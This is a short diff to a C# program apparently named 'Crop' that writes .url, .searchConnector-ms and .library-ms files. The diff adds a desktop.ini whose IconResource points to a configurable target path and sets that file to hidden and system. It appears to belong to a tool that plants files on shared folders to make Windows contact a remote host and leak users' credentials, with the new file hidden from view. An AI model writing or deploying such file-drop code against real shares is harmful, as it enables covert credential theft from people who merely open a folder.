@@ -216,6 +216,11 @@ namespace Crop
                 "  </searchConnectorDescriptionList>\n" +
                 "</libraryDescription>";
 
+            var shellclassinfostr =
+                "[.ShellClassInfo]\n" +
+                "IconResource="+Config.targetPath+"\n";
+
+
             var output = "";
 
             if (Config.targetFilename.ToLower().EndsWith(".url"))
@@ -224,8 +229,14 @@ namespace Crop
                 output = searchconnectorstr;
             else if (Config.targetFilename.ToLower().EndsWith(".library-ms"))
                 output = librarymsstr;
+            else if (Config.targetFilename.ToLower()=="desktop.ini")
+                output = shellclassinfostr;
 
             System.IO.File.WriteAllText(destOut, output);
+            if (Config.targetFilename.ToLower() == "desktop.ini")
+            {
+                System.IO.File.SetAttributes(destOut, System.IO.File.GetAttributes(destOut) | System.IO.FileAttributes.Hidden | System.IO.FileAttributes.System);
+            }
         }
     }
 }
